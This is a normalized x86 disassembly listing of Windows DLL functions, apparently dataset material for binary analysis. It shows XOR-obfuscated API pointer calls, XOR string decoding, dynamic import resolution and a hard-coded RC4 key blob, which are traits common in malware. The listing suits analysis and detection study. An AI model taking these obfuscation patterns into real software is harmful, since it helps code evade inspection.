mov edi [ ebp - 0x44 ]
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0x34 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x3c ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_1001c5c0
mov eax esi
call sub_10019c00
retn 0x20
add edi 0xc
xor eax eax
jle r-xdata
push edi
lea eax [ ebp - 0x48 ]
push eax
push esi
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_10024496
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push [ ebp - 0x40 ]
lea ecx [ ebp + 0xc ]
sub esi eax
add ebx eax
call sub_1002836c
test esi esi
jne r-xdata
test eax eax
js r-xdata
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
push ebx
call sub_10078ac0
pop ecx
inc eax
jmp r-xdata
sub_1004d8d0
push ecx
push rw-data
call sub_100024e0
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0xa
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
cmp eax 0x102
sete cl
mov eax ecx
pop ecx
retn
mov eax 0x1
pop ecx
retn
sub_1004d910
push ebp
mov ebp esp
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x104
mov edi ecx
mov ecx [ edi + 0x4 ]
lea eax [ ebp - 0x228 ]
push eax
push ecx
mov [ ebp - 0x234 ] 0x0
call [ ExpandEnvironmentStringsW@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
mov [ ebp - 0x22c ] edx
mov bl 0x38
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
push 0x80000000
lea eax [ ebp - 0x228 ]
push eax
call [ ebp - 0x22c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x0
push esi
call [ GetFileSize@IAT ]
mov [ ebp - 0x230 ] eax
push esi
cmp eax 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x22c ] edx
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
call [ ebp - 0x22c ]
cmp [ ebp - 0x230 ] 0x1e84800
jae r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x22c ] ecx
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
call [ ebp - 0x22c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x228 ]
push edx
mov ecx edi
call sub_10056660
test eax eax
jne r-xdata
lea eax [ ebp - 0x230 ]
push eax
lea ecx [ ebp - 0x234 ]
push ecx
lea eax [ ebp - 0x228 ]
call sub_10039230
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x61
call sub_1001bb80
mov ebx edx
lea edx [ ebp - 0x1c ]
mov eax 0x4
call sub_1001bb80
mov ebx edx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x61
call sub_1001bb80
mov ebx edx
call sub_10067110
xor edi edi
lea edx [ ebp - 0x1c ]
mov eax 0x4
call sub_1001bb80
mov ebx edx
call sub_10067110
jmp r-xdata
call sub_10067110
mov esi [ ebp - 0x234 ]
mov ecx [ ebp - 0x230 ]
push edi
mov edx esi
call sub_1001f7e0
push esi
call [ LocalFree@IAT ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1004dae0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007e05b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1004dbb5
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10012309
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_1004dbe5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor eax eax
mov [ esi + edi * 2 ] ax
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_10065045
pop ecx
pop ebx
lea eax [ edi + edi ]
push eax
push ebx
push esi
call sub_10078600
add esp 0xc
sub_1004dc30
cmp [ esi + 0x68 ] 0x8
jb r-xdata
push ebx
push edi
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x64 ] edi
mov [ esi + 0x54 ] cx
cmp [ esi + 0x4c ] 0x8
jb r-xdata
mov eax [ esi + 0x54 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ esi + 0x4c ] ebx
mov [ esi + 0x48 ] edi
mov [ esi + 0x38 ] ax
cmp [ esi + 0x30 ] 0x8
jb r-xdata
mov edx [ esi + 0x38 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] edi
mov [ esi + 0x1c ] dx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
call sub_10065045
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
xor ecx ecx
pop edi
mov [ esi ] cx
pop ebx
retn
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
sub_1004dcc0
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov eax [ ecx + 0x20 ]
mov ecx [ eax ]
mov [ ecx ] dl
mov eax edx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_1004dd10
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea ebx [ ebp - 0x44 ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
call sub_1006c470
mov ebx [ ebp + 0x10 ]
push ebx
lea eax [ ebp - 0x44 ]
push esi
push eax
call sub_10040c60
lea edi [ ebp - 0x44 ]
call sub_1006c4e0
mov edi [ ebp - 0x38 ]
push esi
push ebx
push r--data
call sub_1001f980
add esp 0x18
xor ebx ebx
mov ecx [ ebp - 0x38 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
mov [ edi + 0x34 ] 0x0
jmp r-xdata
xor eax eax
mov ecx [ ecx + 0x8 ]
mov eax [ ecx + eax * 4 - 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x34 ]
mov eax r--data
cmp ecx 0x3
ja r-xdata
mov ebx 0x1
test ebx ebx
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov ecx [ edi ]
mov edx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x30 ]
push edx
push ecx
push eax
push r--data
call sub_1001f980
lea edx [ ebp - 0x34 ]
mov eax 0x1
add esp 0x14
mov [ edi + 0x68 ] edx
cmp [ ebp - 0x34 ] eax
jne r-xdata
jmp [ ecx * 4 + jump_table_1004df44 ]
mov eax 0x1
jmp r-xdata
mov [ edi + 0x38 ] eax
lea eax [ ebp - 0x44 ]
push eax
lea esi [ ebp - 0x34 ]
call sub_10071da0
add esp 0x4
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax r--data
jmp r-xdata
mov edx [ ebp - 0x1c ]
push edx
call sub_1003b570
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
push eax
call sub_1003b570
add esp 0x4
jmp r-xdata
mov eax r--data
push eax
lea edx [ ebp - 0x44 ]
push edx
call sub_1002e4b0
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_10027f30
add esp 0x10
test eax eax
je r-xdata
mov ebx 0x1
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x34 ] 0x7
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
lea eax [ ebp - 0x34 ]
call sub_1006c750
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp - 0x48 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
cmp [ edi + 0x34 ] 0x0
je r-xdata
mov [ eax ] 0x29
cmp [ edi + 0x34 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
lea eax [ ebp - 0x44 ]
call sub_1006e6f0
mov eax [ ebp - 0x40 ]
mov esi [ eax ]
cmp [ esi + 0x20 ] 0x0
jne r-xdata
cmp [ esi + 0x24 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x44 ]
push r--data
push ecx
call sub_1002bb60
add esp 0x8
mov [ esi + 0x20 ] eax
cmp [ esi + 0x28 ] 0x0
jne r-xdata
lea edx [ ebp - 0x44 ]
push r--data
push edx
call sub_1002bb60
add esp 0x8
mov [ esi + 0x24 ] eax
mov esi [ ebp - 0x38 ]
lea ecx [ esi + 0x14 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
call sub_1005fce0
lea eax [ esi + 0x8 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_1005fce0
lea edx [ esi + 0x20 ]
push edx
lea eax [ ebp - 0x44 ]
push eax
call sub_1005fce0
lea ecx [ esi + 0x48 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
call sub_1001bc80
lea eax [ ebp - 0x44 ]
push esi
push eax
call sub_10030ff0
lea ecx [ ebp - 0x44 ]
push ecx
call sub_10019210
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x40 ]
add esp 0x2c
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x44 ]
push r--data
push eax
call sub_1002bb60
add esp 0x8
mov [ esi + 0x28 ] eax
sub_1004df54
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_10023671
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1004dfd0
push ebp
mov ebp esp
sub esp 0x15c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp [ esi + 0x90 ] 0x0
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xa4 ]
push ebx
push edi
lea ebx [ esi + 0x94 ]
push r--data
xor edi edi
mov ecx ebx
call sub_1005e510
test eax eax
je r-xdata
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
push eax
call [ LoadLibraryW@IAT ]
mov [ esi + 0x90 ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
lea edx [ ebp - 0x58 ]
mov eax 0xee
call sub_1001bb80
pop edi
pop ebx
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
mov eax [ esi + 0x90 ]
push eax
push 0x0
push 0x0
push 0x104
lea eax [ ebp - 0x15c ]
push eax
push 0xffffffff
push ebx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edx [ esi + 0x90 ]
lea ecx [ ebp - 0x15c ]
push ecx
push edx
jmp r-xdata
mov ebx [ ebx ]
lea edx [ ebp - 0x54 ]
mov eax 0x12c
call sub_1001bb80
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x28 ]
mov eax 0xb5
call sub_1001bb80
lea edx [ ebp - 0x44 ]
mov eax 0x9c
call sub_1001bb80
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
jb r-xdata
call [ GetProcAddress@IAT ]
mov edi eax
test edi edi
jne r-xdata
push eax
call edi
mov ecx [ ebp - 0x4 ]
pop edi
mov [ esi + 0x50 ] eax
pop ebx
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ eax ]
sub_1004e11d
push 0x4
mov eax sub_1007e274
call sub_10050d0f
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x10 ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x8
mov [ ebp + 0x10 ] eax
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_1004c670
push esi
push eax
push edi
call sub_100112ed
add esp 0x10
push 0x18
call sub_1005ac7e
pop ecx
cmp eax ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_1003d90f
push esi
push eax
push edi
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
mov ecx eax
call sub_10035f20
mov esi eax
jmp r-xdata
push [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_10008b51
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_1001feab
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_10023c43
mov eax [ ebp + 0xc ]
or [ edi + 0x10 ] eax
mov eax [ esi + 0x1c ]
add esp 0x30
cmp eax ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_1001a10c
push esi
push eax
push edi
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push edi
call sub_100112ed
add esp 0xc
jmp r-xdata
push eax
lea ecx [ edi + 0x18 ]
call sub_1005daf0
mov eax edi
call sub_1001a1b3
retn
lea eax [ esi + 0x20 ]
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10017b25
push esi
push eax
push edi
call sub_100112ed
add esp 0x10
push 0x8
call sub_1005ac7e
pop ecx
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push edi
call sub_100112ed
add esp 0xc
jmp r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_100519c6
push esi
push eax
push edi
call sub_100112ed
add esp 0x10
push 0x18
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push edi
call sub_100112ed
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push edi
call sub_100112ed
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_10058754
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push edi
call sub_100112ed
add esp 0xc
jmp r-xdata
sub_1004e38b
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1004e415
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_1004e46d
push 0x20
mov eax sub_1007f1c2
call sub_10007703
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1004aa85
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_100146b0
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_1001c5c0
mov eax edi
call sub_10019c00
retn 0x24
sub_1004e4ec
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_10078a1d
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_10044fed
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_1004e5d0
push ebp
mov ebp esp
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0xd0 ] eax
xor eax eax
mov [ ebp - 0x14 ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0xcc ] eax
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2f
and edx 0xff
mov [ ebp + eax * 2 - 0x6c ] dx
inc eax
cmp eax 0x10
jb r-xdata
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x4c ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xc8 ]
push edx
mov edx [ ebp - 0x14 ]
push r--data
lea eax [ ebp - 0x6c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xc8 ]
jns r-xdata
lea edx [ ebp - 0xc0 ]
mov [ ebp - 0xc0 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xd
call sub_1000a6f0
mov esi [ ebx + 0xc ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc0 ]
push edx
push edi
call sub_10038260
test eax eax
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x12e
jmp r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0xc6
call sub_1000a6f0
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x4d
call sub_1000a6f0
mov esi [ ebx + 0x4 ]
mov eax edx
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
push edi
call sub_10038260
test eax eax
je r-xdata
call sub_1000a6f0
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc0 ] 0x0
lea edx [ ebp - 0x14 ]
mov eax 0xd8
call sub_1000a6f0
mov esi [ ebx + 0x8 ]
push edx
lea eax [ ebp - 0xc0 ]
push eax
push edi
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x97
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x104
call sub_1000a6f0
mov esi [ ebx + 0x10 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc0 ]
push edx
push edi
call sub_10038260
test eax eax
jne r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x101
jmp r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0xc4 ] eax
lea eax [ ebp - 0xc4 ]
push eax
push 0x0
push 0x80000000
push ecx
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xc4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0x2d
call sub_1000a6f0
mov esi [ ebp - 0xc4 ]
push edx
lea eax [ ebp - 0xc0 ]
push eax
push edi
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xc4 ] eax
mov ecx [ ebp - 0xc4 ]
push ecx
call [ SysFreeString@IAT ]
mov edx [ ebp - 0xd0 ]
mov eax [ edx ]
mov ecx [ eax ]
lea edx [ ebp - 0xcc ]
push edx
mov edx [ ebp - 0xc8 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0xcc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x1b
call sub_1000a6f0
lea edx [ ebp - 0xbc ]
mov eax 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xcc ] 0x0
jmp r-xdata
sub_1004e890
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f520
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x4
xor ebx ebx
push ebx
mov esi ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
push 0x1c
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] 0x208
mov [ ebp - 0x28 ] 0x6801
mov [ ebp - 0x24 ] 0x10
mov [ ebp - 0x20 ] 0x526278b5
mov [ ebp - 0x1c ] 0xd7243e98
mov [ ebp - 0x18 ] 0x7ceec63b
mov [ ebp - 0x14 ] 0x6291edb9
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
push edi
push esi
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
